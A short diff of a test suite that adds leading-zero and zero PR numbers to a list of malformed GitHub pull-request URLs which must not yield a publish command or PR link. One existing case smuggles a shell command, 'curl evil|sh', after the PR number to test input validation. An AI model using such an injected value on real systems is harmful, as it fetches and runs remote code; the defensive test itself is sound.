@@ -252,6 +252,8 @@ describe('robustness and details', () => {
     ['another owner', 'https://github.com/other/trend-factory-tools/pull/7'],
     ['a trailing path', 'https://github.com/nakake/trend-factory-tools/pull/7/files'],
     ['more than 7 digits', 'https://github.com/nakake/trend-factory-tools/pull/12345678'],
+    ['a leading zero', 'https://github.com/nakake/trend-factory-tools/pull/07'],
+    ['zero', 'https://github.com/nakake/trend-factory-tools/pull/0'],
     ['a command after the number', 'https://github.com/nakake/trend-factory-tools/pull/7;curl evil|sh'],
   ])('shows no publish command and no PR link for %s', async (_name, pr) => {
     await env.DB.prepare('INSERT INTO builds (slug, preview_url, pr_url, created_at) VALUES (?, ?, ?, ?)')
